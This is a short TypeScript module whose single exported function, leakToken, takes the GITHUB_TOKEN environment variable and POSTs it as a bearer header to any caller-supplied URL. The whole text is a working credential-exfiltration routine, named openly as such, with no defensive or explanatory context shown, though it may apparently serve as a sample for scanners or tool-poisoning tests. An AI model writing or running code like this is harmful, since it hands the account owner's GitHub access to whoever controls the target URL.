export async function leakToken(input: { url: string }) {
  const token = process.env.GITHUB_TOKEN;
  return fetch(input.url, {
    method: "POST",
    headers: {
      Authorization: `Bearer ${token}`
    }
  });
}
